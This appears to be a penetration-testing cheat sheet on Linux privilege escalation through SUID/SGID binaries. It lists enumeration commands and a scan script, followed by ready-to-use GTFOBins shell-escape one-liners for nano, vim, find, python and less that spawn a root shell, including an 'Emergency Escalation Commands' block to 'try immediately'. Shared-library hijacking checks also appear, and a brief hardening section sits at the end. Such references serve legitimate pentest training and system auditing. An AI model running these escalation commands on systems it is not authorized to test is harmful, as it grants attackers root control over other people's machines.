# 🔐 Special Permissions (SUID/SGID)

## 🎯 Overview

SUID and SGID special permissions allow programs to execute with elevated privileges, providing potential privilege escalation vectors through vulnerable or misconfigured binaries.

## 🔍 Permission Types

### SUID (Set User ID)
- **Symbol**: `s` in user execute position
- **Function**: Execute program with **owner's privileges**
- **Risk**: If owner is root, program runs as root

### SGID (Set Group ID)  
- **Symbol**: `s` in group execute position
- **Function**: Execute program with **group's privileges**
- **Risk**: Inherit group permissions during execution

## 🔍 Enumeration Commands

### Find SUID Binaries
```bash
# SUID binaries (most common)
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Alternative format
find / -type f -perm -4000 -ls 2>/dev/null
```

### Find SGID Binaries
```bash
# SGID binaries
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Both SUID and SGID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### Common SUID/SGID Locations
```bash
# Typical paths to check
/bin/
/usr/bin/  
/usr/local/bin/
/sbin/
/usr/sbin/
/usr/local/sbin/
```

## 🎯 GTFOBins Exploitation

### High-Risk SUID Binaries
```bash
# Common exploitable SUID binaries
nano, vim, vi          # Text editors
find                   # File finder
nmap                   # Network scanner
python, python3        # Interpreters
less, more            # Pagers
tail, head             # File readers
awk, sed               # Text processors
```

### Quick GTFOBins Check
```bash
# Cross-reference found SUID binaries with GTFOBins
curl -s https://gtfobins.github.io/ | html2text | grep -E "^[a-z-]+$" | while read binary; do
    if find / -name "$binary" -perm -4000 2>/dev/null | grep -q .; then
        echo "SUID BINARY FOUND: $binary - Check GTFOBins!"
    fi
done
```

## 🚀 Common Exploitation Examples

### nano/vim SUID Exploitation
```bash
# If nano has SUID bit
nano
# In nano: Ctrl+R Ctrl+X
# Execute: reset; bash 1>&0 2>&0

# If vim has SUID bit  
vim -c ':!/bin/bash'
```

### find SUID Exploitation
```bash
# If find has SUID bit
find . -exec /bin/bash \; -quit
find . -exec /bin/sh \; -quit
```

### python SUID Exploitation
```bash
# If python has SUID bit
python -c "import os; os.setuid(0); os.system('/bin/bash')"
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### less/more SUID Exploitation
```bash
# If less has SUID bit
less /etc/passwd
# In less: !/bin/bash

# If more has SUID bit
more /etc/passwd
# In more: !/bin/bash
```

## 🔧 Advanced Techniques

### Custom SUID Binary Analysis
```bash
# Analyze unknown SUID binary
file /path/to/suid_binary
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary
```

### Shared Library Hijacking
```bash
# Check for library dependencies
ldd /path/to/suid_binary

# Find writable library paths
ldd /path/to/suid_binary | grep "=> /" | awk '{print $3}' | xargs ls -la
```

## 📋 Enumeration Script

```bash
#!/bin/bash
echo "=== SPECIAL PERMISSIONS ENUMERATION ==="

echo "[+] SUID binaries:"
find / -type f -perm -4000 2>/dev/null | head -20

echo "[+] SGID binaries:"
find / -type f -perm -2000 2>/dev/null | head -10

echo "[+] Both SUID and SGID:"
find / -type f -perm -6000 2>/dev/null

echo "[+] Custom SUID binaries (non-standard paths):"
find /home /opt /usr/local -type f -perm -4000 2>/dev/null

echo "[+] GTFOBins candidates:"
for binary in nano vim vi find python python3 less more tail head; do
    if find / -name "$binary" -perm -4000 2>/dev/null | grep -q .; then
        echo "  SUID: $binary - CHECK GTFOBINS!"
    fi
done
```

## 🔑 Quick Exploitation Reference

### Immediate Privilege Escalation
```bash
# Check for common exploitable SUID binaries
find / -type f -perm -4000 2>/dev/null | grep -E "(nano|vim|vi|find|python|less|more|tail|head|awk|sed)"

# GTFOBins one-liner check
for i in $(find / -type f -perm -4000 2>/dev/null | xargs basename | sort -u); do echo "Check GTFOBins for: $i"; done
```

### Emergency Escalation Commands
```bash
# If you find these SUID, try immediately:
nano -> Ctrl+R Ctrl+X -> reset; bash 1>&0 2>&0
vim -> :!/bin/bash  
find -> find . -exec /bin/bash \; -quit
python -> python -c "import os; os.setuid(0); os.system('/bin/bash')"
less -> !/bin/bash
```

## 🛡️ Defensive Considerations

### Dangerous SUID Configurations
- **Text editors** (nano, vim) with SUID
- **Interpreters** (python, perl) with SUID
- **File utilities** (find, cp, mv) with SUID
- **Custom applications** in user directories

### Hardening Recommendations
```bash
# Remove unnecessary SUID bits
chmod u-s /path/to/binary

# Audit SUID binaries regularly
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null > suid_audit.txt

# Monitor for new SUID binaries
```

---

*Special permissions create powerful attack vectors - SUID and SGID bits can transform ordinary binaries into privilege escalation tools when combined with GTFOBins techniques.* 